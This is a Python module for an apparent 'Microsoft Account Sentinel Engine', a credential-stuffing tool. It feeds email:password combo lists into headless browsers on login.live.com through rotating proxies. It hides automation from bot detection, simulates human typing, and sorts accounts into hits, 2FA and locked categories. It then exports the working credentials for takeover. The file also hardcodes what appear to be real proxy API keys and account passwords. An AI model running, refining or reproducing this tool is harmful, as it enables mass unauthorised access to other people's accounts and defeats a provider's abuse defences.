# ==========================================================
# FILE: engine_core.py
# VERSION: v1.0 — Microsoft Account Sentinel Engine
# DESCRIPTION: Async Playwright-based Microsoft login checker.
#              Webshare + Oxylabs proxy integration.
#              Called directly from app.py via asyncio.run()
# ==========================================================

import asyncio
import random
import time
import requests
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PWTimeout

# ─── CREDENTIALS ──────────────────────────────────────────
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_PROXIES = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",
]

# ─── RESULT STATUS CODES ──────────────────────────────────
STATUS_HIT          = "HIT"
STATUS_BAD_PASS     = "BAD_PASSWORD"
STATUS_LOCKED       = "LOCKED"
STATUS_NOT_EXIST    = "NOT_EXIST"
STATUS_CAPTCHA      = "CAPTCHA"
STATUS_2FA          = "2FA_REQUIRED"
STATUS_RATE_LIMITED = "RATE_LIMITED"
STATUS_ERROR        = "ERROR"
STATUS_TIMEOUT      = "TIMEOUT"

# ─── DEVICE POOL ─────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

VIEWPORTS = [
    {"width": 1920, "height": 1080},
    {"width": 1366, "height": 768},
    {"width": 1440, "height": 900},
    {"width": 1536, "height": 864},
]

# ──────────────────────────────────────────────────────────
# PROXY POOL LOADER
# ──────────────────────────────────────────────────────────
def _fetch_webshare_key(api_key: str) -> list[str]:
    """Fetches live proxy list from one Webshare API key."""
    out = []
    try:
        headers = {"Authorization": f"Token {api_key.strip()}"}
        page = 1
        while page <= 25:
            url = (
                f"https://proxy.webshare.io/api/v2/proxy/list/"
                f"?mode=direct&page={page}&page_size=100"
            )
            r = requests.get(url, headers=headers, timeout=20)
            if r.status_code == 401:
                break
            if r.status_code != 200:
                break
            data  = r.json()
            items = data.get("results", [])
            if not items:
                break
            for it in items:
                try:
                    line = (
                        f"{it['username']}:{it['password']}"
                        f"@{it['proxy_address']}:{it['port']}"
                    )
                    out.append(f"http://{line}")
                except (KeyError, TypeError):
                    continue
            if not data.get("next"):
                break
            page += 1
    except Exception:
        pass
    return out


def get_live_proxy_pool() -> list[str]:
    """
    Fetches all proxies from all Webshare keys + Oxylabs.
    Returns list of formatted proxy strings: http://user:pass@host:port
    Called by app.py on startup.
    """
    all_proxies = []
    for key in WEBSHARE_KEYS:
        fetched = _fetch_webshare_key(key)
        all_proxies.extend(fetched)
    for ox in OXYLABS_PROXIES:
        all_proxies.append(f"http://{ox}")
    return list(dict.fromkeys(all_proxies))  # dedup


# ──────────────────────────────────────────────────────────
# PROXY HEALTH TESTER
# ──────────────────────────────────────────────────────────
async def _test_single_proxy(proxy: str, timeout: int = 7) -> dict:
    """Tests one proxy against ipify. Returns result dict."""
    start = time.time()
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None,
            lambda: requests.get(
                "https://api.ipify.org?format=json",
                proxies={"http": proxy, "https": proxy},
                timeout=timeout,
            )
        )
        latency = int((time.time() - start) * 1000)
        if result.status_code == 200:
            return {
                "proxy":   proxy,
                "status":  "Active",
                "latency": f"{latency}ms",
                "alive":   True,
            }
        return {"proxy": proxy, "status": "Dead", "latency": "N/A", "alive": False}
    except Exception:
        return {"proxy": proxy, "status": "Dead", "latency": "N/A", "alive": False}


async def batch_test_proxies(proxy_list: list[str], timeout: int = 7) -> list[dict]:
    """
    Tests all proxies in parallel.
    Returns list of {proxy, status, latency, alive} dicts.
    Called from tab_proxies health check button.
    """
    tasks = [_test_single_proxy(p, timeout) for p in proxy_list]
    return await asyncio.gather(*tasks)


# ──────────────────────────────────────────────────────────
# MICROSOFT LOGIN CHECKER — CORE
# ──────────────────────────────────────────────────────────
async def _check_single_account(
    email:        str,
    password:     str,
    proxy:        str | None,
    timeout:      int,
    stealth:      bool,
    force_en_us:  bool,
    block_webauthn: bool,
    warm_up:      bool,
    auto_kmsi:    bool,
    typing_speed: int,
) -> dict:
    """
    Single account check via Playwright against login.live.com.
    Returns result dict with status, email, timestamp, notes.
    """
    result = {
        "email":     email,
        "password":  password,
        "status":    STATUS_ERROR,
        "proxy":     proxy or "direct",
        "timestamp": datetime.now().isoformat(),
        "notes":     "",
    }

    proxy_config = {"server": proxy} if proxy else None
    ua           = random.choice(USER_AGENTS)
    viewport     = random.choice(VIEWPORTS)

    try:
        async with async_playwright() as p:
            launch_args = [
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
            ]
            if block_webauthn:
                launch_args.append("--disable-features=WebAuthentication")

            browser = await p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=launch_args,
            )

            context = await browser.new_context(
                user_agent=ua,
                viewport=viewport,
                locale="en-US" if force_en_us else None,
                java_script_enabled=True,
            )

            # Stealth: remove navigator.webdriver flag
            if stealth:
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
                    window.chrome = {runtime: {}};
                """)

            page = await context.new_page()
            page.set_default_timeout(timeout * 1000)

            # ── Warm-up: visit neutral site first ─────────
            if warm_up:
                try:
                    await page.goto("https://www.bing.com/", timeout=10000)
                    await asyncio.sleep(random.uniform(0.8, 1.5))
                except Exception:
                    pass

            # ── Navigate to Microsoft login ────────────────
            await page.goto(
                "https://login.live.com/login.srf?wa=wsignin1.0",
                wait_until="domcontentloaded",
                timeout=timeout * 1000,
            )

            # ── EMAIL FIELD ────────────────────────────────
            try:
                await page.wait_for_selector("input[type='email']", timeout=8000)
            except PWTimeout:
                result["status"] = STATUS_ERROR
                result["notes"]  = "Email field did not appear"
                await browser.close()
                return result

            # Human-like typing
            delay_ms = max(30, typing_speed)
            await page.type("input[type='email']", email, delay=delay_ms)
            await asyncio.sleep(random.uniform(0.3, 0.7))
            await page.click("#idSIButton9")  # Next button

            # ── DETECT: account does not exist ────────────
            try:
                await page.wait_for_selector(
                    "#usernameError, [data-bind*='accountDoesNotExist']",
                    timeout=4000
                )
                result["status"] = STATUS_NOT_EXIST
                await browser.close()
                return result
            except PWTimeout:
                pass

            # ── PASSWORD FIELD ────────────────────────────
            try:
                await page.wait_for_selector("input[type='password']", timeout=8000)
            except PWTimeout:
                # Check if we hit CAPTCHA before password
                if await page.query_selector("iframe[src*='captcha'], #captchaContainer"):
                    result["status"] = STATUS_CAPTCHA
                    result["notes"]  = "CAPTCHA before password field"
                else:
                    result["status"] = STATUS_ERROR
                    result["notes"]  = "Password field did not appear"
                await browser.close()
                return result

            await page.type("input[type='password']", password, delay=delay_ms)
            await asyncio.sleep(random.uniform(0.3, 0.6))
            await page.click("#idSIButton9")  # Sign in button

            # ── WAIT FOR POST-LOGIN STATE ─────────────────
            await asyncio.sleep(2.5)

            current_url = page.url
            page_content = await page.content()

            # ── RESULT DETECTION ──────────────────────────

            # CAPTCHA checkpoint
            if (
                "captcha" in current_url.lower()
                or await page.query_selector("iframe[src*='captcha'], #captchaContainer, .captcha-container")
            ):
                result["status"] = STATUS_CAPTCHA
                result["notes"]  = "CAPTCHA checkpoint triggered"
                await browser.close()
                return result

            # Rate limited
            if "tooManyRequests" in current_url or "429" in page_content[:500]:
                result["status"] = STATUS_RATE_LIMITED
                result["notes"]  = "Rate limited by Microsoft"
                await browser.close()
                return result

            # Account locked / blocked
            if (
                "accountblocked" in current_url.lower()
                or await page.query_selector("#aadTile, [data-bind*='accountBlocked']")
                or "account has been locked" in page_content.lower()
            ):
                result["status"] = STATUS_LOCKED
                result["notes"]  = "Account locked or blocked"
                await browser.close()
                return result

            # Wrong password
            pw_error = await page.query_selector(
                "#passwordError, [data-bind*='wrongPassword'], [data-bind*='incorrectPassword']"
            )
            if pw_error:
                err_text = await pw_error.inner_text()
                result["status"] = STATUS_BAD_PASS
                result["notes"]  = err_text.strip()
                await browser.close()
                return result

            # 2FA / verification required
            if (
                "proofup" in current_url.lower()
                or "verify" in current_url.lower()
                or await page.query_selector("#idDiv_SAOTCC_Title, [data-bind*='twoFactor']")
                or "verify your identity" in page_content.lower()
                or "enter the code" in page_content.lower()
            ):
                result["status"] = STATUS_2FA
                result["notes"]  = "2FA / verification required"
                # Auto-accept KMSI if 2FA passed us through
                if auto_kmsi:
                    try:
                        kmsi_btn = await page.query_selector("#idSIButton9")
                        if kmsi_btn:
                            await kmsi_btn.click()
                    except Exception:
                        pass
                await browser.close()
                return result

            # KMSI prompt ("Stay signed in?")
            kmsi = await page.query_selector("#KmsiCheckboxField, #idSIButton9")
            if kmsi and "stay signed in" in page_content.lower():
                if auto_kmsi:
                    try:
                        await page.click("#idSIButton9")
                        await asyncio.sleep(1.5)
                        current_url = page.url
                    except Exception:
                        pass

            # SUCCESS: landed on Microsoft account or Outlook
            if any(domain in current_url for domain in [
                "account.microsoft.com",
                "outlook.live.com",
                "outlook.office.com",
                "onedrive.live.com",
                "microsoft.com/consent",
                "live.com/oauth20",
            ]):
                result["status"] = STATUS_HIT
                result["notes"]  = f"Authenticated — {current_url[:80]}"
                await browser.close()
                return result

            # Fallback: still on login page = bad password
            if "login.live.com" in current_url or "login.microsoftonline.com" in current_url:
                result["status"] = STATUS_BAD_PASS
                result["notes"]  = "Still on login page after submit"
                await browser.close()
                return result

            # Unknown state
            result["status"] = STATUS_ERROR
            result["notes"]  = f"Unknown post-login URL: {current_url[:100]}"
            await browser.close()
            return result

    except PWTimeout:
        result["status"] = STATUS_TIMEOUT
        result["notes"]  = f"Timed out after {timeout}s"
        return result
    except Exception as e:
        result["status"] = STATUS_ERROR
        result["notes"]  = str(e)[:120]
        return result


# ──────────────────────────────────────────────────────────
# BATCH CHECKER — SEMAPHORE-CONTROLLED CONCURRENCY
# ──────────────────────────────────────────────────────────
async def batch_check_accounts(
    combo_list:     list[str],
    proxy_list:     list[str] | None = None,
    timeout:        int  = 25,
    max_concurrent: int  = 10,
    stealth:        bool = True,
    force_en_us:    bool = True,
    block_webauthn: bool = True,
    warm_up:        bool = True,
    auto_kmsi:      bool = True,
    typing_speed:   int  = 50,
    delay_between:  int  = 2,
    rotation:       str  = "Sticky Session (Per Account)",
    log_callback=None,  # optional: fn(str) for live log streaming
) -> list[dict]:
    """
    Processes all combos concurrently up to max_concurrent.
    proxy_list: list of http://user:pass@host:port strings.
    rotation: 'Sticky Session (Per Account)' | 'Round-Robin (Per Request)'
    log_callback: callable(str) that receives live log lines.
    Returns list of result dicts.
    """
    semaphore = asyncio.Semaphore(max_concurrent)

    # Build proxy assignment map (sticky)
    sticky_map: dict[str, str | None] = {}
    rr_cursor  = 0

    def get_proxy(email: str) -> str | None:
        nonlocal rr_cursor
        if not proxy_list:
            return None
        if rotation == "Sticky Session (Per Account)":
            if email not in sticky_map:
                sticky_map[email] = proxy_list[rr_cursor % len(proxy_list)]
                rr_cursor += 1
            return sticky_map[email]
        elif rotation == "Round-Robin (Per Request)":
            p = proxy_list[rr_cursor % len(proxy_list)]
            rr_cursor += 1
            return p
        else:  # Static
            return proxy_list[0]

    def _log(msg: str):
        ts   = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {msg}"
        if log_callback:
            log_callback(line)

    async def _worker(combo: str, idx: int, total: int) -> dict:
        async with semaphore:
            # Parse combo
            if ":" not in combo:
                _log(f"[SKIP] Bad format: {combo}")
                return {"email": combo, "password": "", "status": STATUS_ERROR, "notes": "Bad combo format", "proxy": "none", "timestamp": datetime.now().isoformat()}

            parts    = combo.split(":", 1)
            email    = parts[0].strip()
            password = parts[1].strip()
            proxy    = get_proxy(email)

            _log(f"[{idx}/{total}] Checking {email} via {(proxy or 'direct').split('@')[-1][:30]}")

            res = await _check_single_account(
                email=email,
                password=password,
                proxy=proxy,
                timeout=timeout,
                stealth=stealth,
                force_en_us=force_en_us,
                block_webauthn=block_webauthn,
                warm_up=warm_up,
                auto_kmsi=auto_kmsi,
                typing_speed=typing_speed,
            )

            status_tag = {
                STATUS_HIT:          "✅ HIT",
                STATUS_BAD_PASS:     "❌ BAD_PASS",
                STATUS_NOT_EXIST:    "👻 NOT_EXIST",
                STATUS_LOCKED:       "🔒 LOCKED",
                STATUS_CAPTCHA:      "🧩 CAPTCHA",
                STATUS_2FA:          "🔐 2FA",
                STATUS_RATE_LIMITED: "⚠️ RATE_LIMIT",
                STATUS_TIMEOUT:      "⏰ TIMEOUT",
                STATUS_ERROR:        "💥 ERROR",
            }.get(res["status"], res["status"])

            _log(f"[{idx}/{total}] {email} → {status_tag} | {res.get('notes','')[:60]}")

            if delay_between > 0:
                await asyncio.sleep(delay_between)

            return res

    total  = len(combo_list)
    tasks  = [_worker(combo, i + 1, total) for i, combo in enumerate(combo_list)]
    return await asyncio.gather(*tasks)


# ──────────────────────────────────────────────────────────
# REPORT COMPILER
# ──────────────────────────────────────────────────────────
def compile_export_reports(results: list[dict]) -> dict:
    """
    Converts raw result list into export-ready format.
    Called by app.py after batch_check_accounts completes.
    """
    hits        = [r for r in results if r["status"] == STATUS_HIT]
    bad_pass    = [r for r in results if r["status"] == STATUS_BAD_PASS]
    not_exist   = [r for r in results if r["status"] == STATUS_NOT_EXIST]
    locked      = [r for r in results if r["status"] == STATUS_LOCKED]
    captcha     = [r for r in results if r["status"] == STATUS_CAPTCHA]
    twofa       = [r for r in results if r["status"] == STATUS_2FA]
    rate_limit  = [r for r in results if r["status"] == STATUS_RATE_LIMITED]
    timeouts    = [r for r in results if r["status"] == STATUS_TIMEOUT]
    errors      = [r for r in results if r["status"] == STATUS_ERROR]

    def fmt_hit(r: dict) -> str:
        return f"{r['email']}:{r['password']}"

    def fmt_checkpoint(r: dict) -> str:
        return f"{r['email']}:{r['password']} | {r['status']} | {r.get('notes','')}"

    hits_text        = "\n".join(fmt_hit(r) for r in hits)
    checkpoints_text = "\n".join(fmt_checkpoint(r) for r in captcha + twofa + locked)
    bad_pass_text    = "\n".join(fmt_hit(r) for r in bad_pass)
    not_exist_text   = "\n".join(r["email"] for r in not_exist)
    errors_text      = "\n".join(fmt_checkpoint(r) for r in errors + timeouts)

    return {
        # Counts
        "total_checked":      len(results),
        "total_hits":         len(hits),
        "total_bad_pass":     len(bad_pass),
        "total_not_exist":    len(not_exist),
        "total_locked":       len(locked),
        "total_captcha":      len(captcha),
        "total_2fa":          len(twofa),
        "total_rate_limited": len(rate_limit),
        "total_timeouts":     len(timeouts),
        "total_errors":       len(errors),
        "total_checkpoints":  len(captcha) + len(twofa) + len(locked),
        # Export text blobs
        "hits_text":          hits_text,
        "checkpoints_text":   checkpoints_text,
        "bad_pass_text":      bad_pass_text,
        "not_exist_text":     not_exist_text,
        "errors_text":        errors_text,
        # Full result objects for JSON export
        "all_results":        results,
        "hits_full":          hits,
    }
